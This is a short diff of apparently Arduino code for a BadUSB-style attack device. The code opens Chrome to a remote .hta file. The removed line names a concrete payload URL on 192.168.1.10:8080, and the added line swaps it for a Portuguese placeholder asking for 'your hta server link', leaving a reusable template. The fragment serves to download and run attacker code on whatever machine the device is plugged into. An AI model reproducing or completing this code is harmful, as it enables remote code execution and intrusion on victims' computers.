@@ -3,7 +3,7 @@ void setup() {
 }
 
 char opensite[] = "start chrome";
-char link[] = " http://192.168.1.10:8080/zStjObfqv.hta";
+char link[] = " o link do seu hta server";
 
 
 void loop() {
